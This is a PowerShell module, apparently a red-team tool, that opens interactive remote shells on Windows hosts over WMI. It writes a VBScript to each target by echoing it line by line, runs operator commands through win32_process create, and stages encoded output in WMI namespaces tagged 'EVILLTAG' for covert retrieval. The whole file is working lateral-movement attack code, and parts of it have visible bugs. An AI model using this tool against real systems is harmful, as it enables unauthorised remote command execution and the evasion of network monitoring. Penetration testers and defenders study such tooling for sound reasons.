function New-WmiShell
{
<#
.SYNOPSIS
Setup interactive shell on a remote host leveraging the WMI service and a VBScript.

Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
Required Dependencies: Base64/Hex encoding VBScript(s)

.DESCRIPTION
New-WmiShell tests connectivity with the WMI service and uploads a VBScript to the remote host(s). The uploaded 
VBScript will receive and execute shell commands via the WMI service and process the output of those commands.
 

.PARAMETER ComputerName 

.PARAMETER UserName

.PARAMETER UploadTo 

.PARAMETER Encoding 


.EXAMPLE
PS C:\> New-WmiShell -ComputerName server01 -UserName 'DOMAIN\Administrator' -UploadTo %TEMP% -Encoding Base64


.INPUTS

.OUTPUTS

.LINK
#>

[CmdLetBinding()]

	Param (
		[Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		[Parameter()]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty,
		[Parameter(Mandatory = $True)]
		[string]$UploadTo,
		[Parameter(Mandatory = $True)]
		[ValidateSet("Base64", "Hex")]
		[string]$Encoding
	) #End Param
	
	BEGIN
	{
		
		#Store credentials for use on remote host(s)
		$creds = Get-Credential -Credential $UserName
		
		# Read VBScript into []
		if ($Encoding -eq "Base64") { $vbscript = gc -Encoding UTF8 .\base64.vbs }

		else { $vbScript = gc -Encoding UTF8 .\hex.vbs }
	}
	
	PROCESS
	{	
		$wmiOn = @()
		$wmiOff = @()
		
		foreach ($name in $ComputerName)
		{			
			#Generate random name for VBScript
			$vbsName = [System.IO.Path]::GetRandomFileName() + ".vbs"
			
			#Grab some data about the host, validation of WMI accessibility
			$os = Get-WmiObject -ComputerName $name -Credential $creds -Class Win32_OperatingSystem
			$comp = Get-WmiObject -ComputerName $name -Credential $creds -Class Win32_ComputerSystem
			#$env = Get-WmiObject -Credential $creds -Class Win32_Environment -ComputerName $computer
			
			$props = @{
				'HostName' = $os.CSName;
				'Maufacturer' = $comp.Manufacturer;
				'Model' = $comp.Model;
				'OS' = $os.Caption;
				'OSVersion' = $os.Version;
				'ServicePack' = $os.ServicePackMajorVerison;
				'Workgroup' = $comp.Workgroup;
				'PartOfDomain' = $comp.PartOfDomain;
				'Domain' = $comp.Domain;
				'OSArchitecture' = $os.OSArchitecture;
				'SystemType' = $comp.SystemType;
				'DEP_32BitApps' = $os.DataExecutionPrevention_32BitApplications;
				'DEP_Available' = $os.DataExecutionPrevention_Available;
				'DEP_Drivers' = $os.DataExecutionPrevention_Drivers;
				'SystemDrive' = $os.SystemDrive;
				'TotalPhysicalMemory' = $comp.TotalPhysicalMemory;
				'Credentials' = $creds;
				'vbsName' = $vbsName;
				'vbsLocation' = $UploadTo;
				'Encoding' = $Encoding;
				'ComputerName' = $ComputerName;
			}
			$obj = New-Object -TypeName PSObject -Property $props
			
			if ($obj.ComputerName) {
				Write-Host -ForegroundColor Green "+ WMI is accessible on $($obj.ComputerName) +"
				$wmiOn += $obj
			}
			else {
				Write-Host -ForegroundColor Yellow "- WMI is not accessible on $($ComputerName) -"
				$wmiOff += $ComputerName
			}	
		}
		
		foreach ($computer in $wmiOn) {
	
			#Upload VBScript to Host
			foreach ($line in $vbScript) {

				$argList = "cmd.exe /c echo $($line) >> $($computer.vbsLocation)\$($computer.vbsName)"
				Invoke-WmiMethod -ComputerName $computer.ComputerName -Credential $computer.Credentials -Class win32_process -Name create -ArgumentList $argList | Out-Null
				
				# Status-bar
				Write-Progress -Status "Please Wait..." -Activity "Uploading VBScript: $($computer.vbsName) to: $($computer.HostName) in $($UploadTo)" -PercentComplete (($line.ReadCount / $vbScript.Length) * 100)
			}
			
			#Validate functionality
			$cScript = "cmd.exe /c cscript.exe $($computer.vbsLocation)\$($computer.vbsName) `"whoami /priv`""
			Invoke-WmiMethod -ComputerName $computer.ComputerName -Credential $computer.Credentials -Class win32_process -Name create -ArgumentList $cScript | Out-Null
            
            # Wait for vbScrpit to finish writing output to WMI namespaces
            $outputReady = ""
            do{$outputReady = Get-WmiObject -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
            until($outputReady)

			Get-WmiShellOutput -UserName $computer.Credentials -ComputerName $computer.ComputerName -Encoding $computer.Encoding
		}
	}
	
	END {
    Write-Host -ForegroundColor Green "WMI Shells successfully setup on $($wmiOn.Length) host(s)"
    Write-Host -ForegroundColor Yellow "WMI Shells failed on $($wmiOff.Length) host(s)"
    $Global:WmiShells = $wmiOn
    }
} Export-ModuleMember New-WmiShell

function List-WmiShells
{

#[CmdLetBinding()]

    foreach($entry in $Global:WmiShells) {
        If ([BOOL]$entry.ReadCount) {
            Write-Host -ForegroundColor Cyan "Session $($entry.ReadCount) = $($entry.ComputerName)"
        }
        else {Write-Host -ForegroundColor Cyan "Session 0 = $($entry.ComputerName)"}
    }
} Export-ModuleMember List-WmiShells

function Get-WmiShellOutput
{
<#
.SYNOPSIS
Retrieves Base64 encdoded data from WMI namespaces.

Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
Required Dependencies: Base64/Hex encoding VBScript(s)

.DESCRIPTION
Get-WmiShellOutput queries WMI for namespaces containing Base64 encdoded data that has been tagged for retrieval, 
retrieves the data, decodes it, and writes the decoded output to the console.
 

.PARAMETER ComputerName 

.PARAMETER UserName

.PARAMETER UploadTo 

.PARAMETER Encoding 


.EXAMPLE
PS C:\> Get-WmiShellOutput -ComputerName server01 -UserName 'DOMAIN\Administrator' -UploadTo %TEMP% -Encoding Base64


.INPUTS

.OUTPUTS

.LINK
#>

[CmdLetBinding()]

	Param (
		[Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		[Parameter(ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
        [ValidateSet("Base64", "Hex")]
		[string]$Encoding
	) #End Param
	
	$getOutput = @()
	$getOutput = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'EVILLTAG%'" | Select-Object Name
	
	if ([BOOL]$getOutput.Length) {
		
		#Read string objects into array, then sort them
		$getStrings = for ($i = 0; $i -lt $getOutput.Length; $i++) { $getOutput[$i].Name }
		$sortStrings = $getStrings | Sort-Object
		
		if ($Encoding -eq "Base64") {
			
            #Decode Base64 output
			foreach ($line in $sortStrings) {
	
				#Replace non-base64 characters
				$cleanString = $line.Remove(0, 14) -replace "`“", "+" -replace "Ã", "" -replace "_", "/"
				
				#Add necessary base64 padding characters
				if ($cleanString.Length % 4 -ne 0) { $cleanString += ("===").Substring(0, 4 - ($cleanString.Length % 4)) }
				
				# Decode base64 string and remove front side spaces
				$decodeString = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString)).Remove(0, 8))
				
				# Remove back side spaces and compile output
				$decodedOutput += $decodeString.Remove(($decodeString.Length - 8), 8)
			}
            Write-Host $decodedOutput
		}
		else {
			
            #Decode Hex output
			foreach ($line in $sortStrings) {
				
				$cleanString = $line.Reomve(0, 15)
                $cleanString.Split(“_“) | foreach { Write-Host -object ([CHAR][BYTE]([CONVERT]::toint16($_, 16))) -NoNewline }
			}
		}
		
	}
	else {
        #Decode single line Base64
        if($Encoding -eq "Base64") {
		    $getStrings = $getOutput.Name
		    $cleanString = $getStrings.Remove(0, 14) -replace "`“", "+" -replace "Ã", "" -replace "_", "/"
            if ($cleanString.Length % 4 -ne 0) { $cleanString += ("===").Substring(0, 4 - ($cleanString.Length % 4)) }
		    $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString)) }
			Write-Host $decodedOutput.Remove(0, 8)
	    }
        #Decode single line Hex
        else {
            $getStrings = $getOutput.Name
            $cleanstring = $getStrings.Remove(0,15)
            $cleanString.Split(“_“) | foreach { Write-Host -object ([CHAR][BYTE]([CONVERT]::toint16($_, 16))) -NoNewline }
        }
} Export-ModuleMember Get-WmiShellOutput

function Enter-WmiShell
{
<#
.SYNOPSIS
Enter interactive WMI pseudo remote-shell.

Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
Required Dependencies: New-WmiShell, Get-WmiShellOutput

.DESCRIPTION
Enter-WmiShell provides a cmd-prompt to interact with a remote-computer.
 
.PARAMETER Session

.PARAMETER ComputerName 

.PARAMETER UserName

.PARAMETER UploadTo 

.PARAMETER Encoding 


.EXAMPLE
PS C:\> Enter-WmiShell -Session 0

.EXAMPLE
PS C:\> Enter-WmiShell -ComputerName server01 -UserName 'DOMAIN\Administrator' -UploadTo %TEMP% -Encoding Base64


.INPUTS

.OUTPUTS

.LINK
#>

[CmdLetBinding(DefaultParameterSetName = "set1")]

	Param (
        [Parameter(ParameterSetName = "set1")]
        [string]$Session,		
        [Parameter(ParameterSetName = "set2",
                   Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		[Parameter(ParameterSetName = "set2")]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty,
		[Parameter(ParameterSetName = "set2", Mandatory = $True)]
		[string]$UploadTo,
		[Parameter(ParameterSetName = "set2", Mandatory = $True)]
		[string]$vbsName
	) #End Param
        
        if ($PSBoundParameters['Session']) {
            $ComputerName = $Global:Wmishells[$Session].ComputerName
            $UserName = $Global:WmiShells[$Session].Credentials
            $UploadTo = $Global:WmiShells[$Session].vbsLocation
            $vbsName = $Global:WmiShells[$Session].vbsName
            $Encoding = $Global:Wmishells[$Session].Encoding
        }

        do{ 
            # Make a pretty prompt for the user to provide commands at
            Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -nonewline -foregroundcolor green -backgroundcolor black 
            $command = Read-Host

            if ($command -eq "retry") { Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Encoding $Encoding }

            else {

                # Execute commands on remote host using cscript.exe and uploaded VBScript
                $cScript = "cmd.exe /c cscript.exe $($UploadTo)\$($vbsName) `"$($command)`""
                Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $cScript | Out-Null
                Start-Sleep -s 1
    
                if ($command -ne "exit") {

                    # Wait for vbScrpit to finish writing output to WMI namespaces
                    $outputReady = ""
                    do{$outputReady = Get-WmiObject -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
                    until($outputReady)

                    # Retrieve cmd output written to WMI namespaces 
                    Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Encoding $Encoding
                }
            }
        }until($command -eq "exit")
} Export-ModuleMember Enter-WmiShell

function Close-WmiShell
{
<#
.SYNOPSIS
Cleans up WMI shell artifacts.

Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
Required Dependencies:

.DESCRIPTION
Close-WmiShell removes the VBScript(s) and any namespaces that have been written to by the WmiShell scripts.
 
.PARAMETER Session

.PARAMETER ComputerName 

.PARAMETER UserName

.PARAMETER UploadTo 

.PARAMETER Encoding 


.EXAMPLE
PS C:\> Close-WmiShell -Session 0

.EXAMPLE
PS C:\> Close-WmiShell -All

.EXAMPLE
PS C:\> Close-WmiShell -ComputerName server01 -UserName 'DOMAIN\Administrator' -UploadTo %TEMP% -Encoding Base64


.INPUTS

.OUTPUTS

.LINK
#>

[CmdLetBinding(DefaultParameterSetName = "set1")]

	Param (
        [Parameter(ParameterSetName = "set1")]
        [ValidatePattern('^\d+$')]
        [string]$Session,
        [Parameter(ParameterSetName = "set2")]
        [Switch]$All,		
        [Parameter(ParameterSetName = "set3",
                   Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		[Parameter(ParameterSetName = "set3")]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty,
		[Parameter(ParameterSetName = "set3", Mandatory = $True)]
		[string]$UploadTo,
		[Parameter(ParameterSetName = "set3", Mandatory = $True)]
		[string]$vbsName
	) #End Param

        if ($PSBoundParameters['Session']) {
            $ComputerName = $Global:Wmishells[$Session].ComputerName
            $UserName = $Global:WmiShells[$Session].Credentials
            $UploadTo = $Global:WmiShells[$Session].vbsLocation
            $vbsName = $Global:WmiShells[$Session].vbsName
            $Encoding = $Global:Wmishells[$Session].Encoding
        }
        elseif ($All) {
            foreach ($obj in $Global:Wmishells) {
                 $cScript = "cmd.exe /c del $($obj.vbsLocation)\$($obj.vbsName)"
                 Invoke-WmiMethod -ComputerName $obj.ComputerName -Credential $obj.Credentials -Class win32_process -Name create -ArgumentList $cScript | Out-Null
            }
        }

        $cScript = "cmd.exe /c del $($UploadTo)\$($vbsName)"
        Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $cScript | Out-Null
} Export-ModuleMember Close-WmiShell
